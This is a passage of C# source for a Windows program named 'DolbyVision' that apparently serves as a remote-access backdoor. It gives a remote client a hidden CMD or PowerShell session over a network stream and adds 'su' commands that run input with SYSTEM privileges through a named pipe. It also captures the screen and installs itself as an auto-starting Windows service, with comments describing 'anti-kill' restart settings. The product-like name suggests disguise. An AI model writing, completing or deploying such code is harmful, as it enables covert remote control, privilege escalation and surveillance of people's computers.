                    string shellArgs = usePs ? "-NoLogo -NoProfile" : "";
                    Encoding shellEncoding = usePs ? Encoding.UTF8 : Encoding.GetEncoding(936);

                    var psi = new ProcessStartInfo(shellExe, shellArgs)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        StandardOutputEncoding = shellEncoding,
                        StandardErrorEncoding = shellEncoding
                    };
                    shell = Process.Start(psi);

                    string shellName = usePs ? "PowerShell" : "CMD";
                    byte[] welcome = Encoding.UTF8.GetBytes("DolbyVision Terminal [" + shellName + "] - " + _machineName + " (" + _localIp + ")\r\nType exit to disconnect\r\n\r\n");
                    stream.Write(welcome, 0, welcome.Length);

                    // 输出转发线程
                    var outputThread = new Thread(() =>
                    {
                        try
                        {
                            byte[] buffer = new byte[4096];
                            while (!shell.HasExited && client.Connected)
                            {
                                int read = shell.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
                                if (read > 0)
                                {
                                    string text = shellEncoding.GetString(buffer, 0, read);
                                    byte[] utf8 = Encoding.UTF8.GetBytes(text);
                                    stream.Write(utf8, 0, utf8.Length);
                                    stream.Flush();
                                }
                            }
                        }
                        catch { }
                    })
                    { IsBackground = true };
                    outputThread.Start();

                    var errorThread = new Thread(() =>
                    {
                        try
                        {
                            byte[] buffer = new byte[4096];
                            while (!shell.HasExited && client.Connected)
                            {
                                int read = shell.StandardError.BaseStream.Read(buffer, 0, buffer.Length);
                                if (read > 0)
                                {
                                    string text = shellEncoding.GetString(buffer, 0, read);
                                    byte[] utf8 = Encoding.UTF8.GetBytes(text);
                                    stream.Write(utf8, 0, utf8.Length);
                                    stream.Flush();
                                }
                            }
                        }
                        catch { }
                    })
                    { IsBackground = true };
                    errorThread.Start();

                    // 杈撳叆杞彂(閫愬瓧绗︾疮绉?鎹㈣鏃舵娴媠u/exit鎻愭潈)
                    byte[] inBuffer = new byte[4096];
                    System.Text.StringBuilder lineBuf = new System.Text.StringBuilder();
                    bool privMode = false; // SYSTEM提权会话模式
                    while (!shell.HasExited && client.Connected)
                    {
                        int read = stream.Read(inBuffer, 0, inBuffer.Length);
                        if (read <= 0) break;
                        string chunk = Encoding.UTF8.GetString(inBuffer, 0, read);
                        foreach (char c in chunk)
                        {
                            if (c == '\r' || c == '\n')
                            {
                                if (c == '\n')
                                {
                                    string line = lineBuf.ToString();
                                    lineBuf.Clear();
                                    string trimmed = line.Trim();
                                    if (!_isServiceMode && trimmed == "su")
                                    {
                                        // 进入SYSTEM提权会话模式
                                        string test = ExecViaPipe("echo ok");
                                        if (test != null)
                                        {
                                            privMode = true;
                                            byte[] ok = Encoding.UTF8.GetBytes("\r\n[已进入SYSTEM权限,输入exit退出]\r\n");
                                            stream.Write(ok, 0, ok.Length); stream.Flush();
                                        }
                                        else
                                        {
                                            byte[] err = Encoding.UTF8.GetBytes("\r\n[提权失败] SYSTEM服务未运行\r\n");
                                            stream.Write(err, 0, err.Length); stream.Flush();
                                        }
                                    }
                                    else if (!_isServiceMode && trimmed.StartsWith("su "))
                                    {
                                        // 单次SYSTEM提权执行
                                        string cmd = trimmed.Substring(3).Trim();
                                        string privResult = ExecViaPipe(cmd);
                                        if (privResult != null)
                                        {
                                            byte[] resp = Encoding.UTF8.GetBytes("\r\n[SYSTEM] " + privResult + "\r\n");
                                            stream.Write(resp, 0, resp.Length); stream.Flush();
                                        }
                                        else
                                        {
                                            byte[] err = Encoding.UTF8.GetBytes("\r\n[提权失败] SYSTEM服务未运行\r\n");
                                            stream.Write(err, 0, err.Length); stream.Flush();
                                        }
                                    }
                                    else if (privMode && trimmed == "exit")
                                    {
                                        // 退出SYSTEM提权会话模式
                                        privMode = false;
                                        byte[] ok = Encoding.UTF8.GetBytes("\r\n[已退出SYSTEM权限,回到普通模式]\r\n");
                                        stream.Write(ok, 0, ok.Length); stream.Flush();
                                    }
                                    else if (privMode)
                                    {
                                        // 提权模式:通过命名管道以SYSTEM执行
                                        string privResult = ExecViaPipe(line);
                                        if (privResult != null)
                                        {
                                            byte[] resp = Encoding.UTF8.GetBytes(privResult + "\r\n");
                                            stream.Write(resp, 0, resp.Length); stream.Flush();
                                        }
                                        else
                                        {
                                            byte[] err = Encoding.UTF8.GetBytes("[提权失败] SYSTEM服务未运行\r\n");
                                            stream.Write(err, 0, err.Length); stream.Flush();
                                        }
                                    }
                                    else
                                    {
                                        // 普通模式:整行发给shell
                                        shell.StandardInput.WriteLine(line);
                                        shell.StandardInput.Flush();
                                    }
                                }
                            }
                            else if (c == '\b')
                            {
                                if (lineBuf.Length > 0)
                                {
                                    lineBuf.Remove(lineBuf.Length - 1, 1);
                                    byte[] bs = Encoding.UTF8.GetBytes("\\b \\b");
                                    stream.Write(bs, 0, bs.Length); stream.Flush();
                                }
                            }
                            else
                            {
                                lineBuf.Append(c);
                                byte[] echo = Encoding.UTF8.GetBytes(c.ToString());
                                stream.Write(echo, 0, echo.Length); stream.Flush();
                            }
                        }
                    }
                }
            }
            catch { }
            finally
            {
                try { shell?.Kill(); } catch { }
            }
        }

        private static Bitmap CaptureScreen()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                }
                return bitmap;
            }
            catch { return null; }
        }

        private static ImageCodecInfo GetJpegCodec()
        {
            foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }

    // ========== Windows服务模式 ==========
    // 安装: sc create DolbyVision binPath= "路径\DolbyVision.exe /service" start= auto
    // 启动: sc start DolbyVision
    // 防杀: sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000
    // 卸载: sc stop DolbyVision & sc delete DolbyVision
    internal class DolbyVisionService : ServiceBase
    {
        public DolbyVisionService()
        {
            ServiceName = "DolbyVision";
            CanStop = true;
            CanShutdown = true;
        }
        protected override void OnStart(string[] args)
        {
            Program.StartServiceMode();
        }
        protected override void OnStop()
        {
            Program.StopServices();
        }
        protected override void OnShutdown()
        {
            Program.StopServices();
            base.OnShutdown();
        }
        }
}
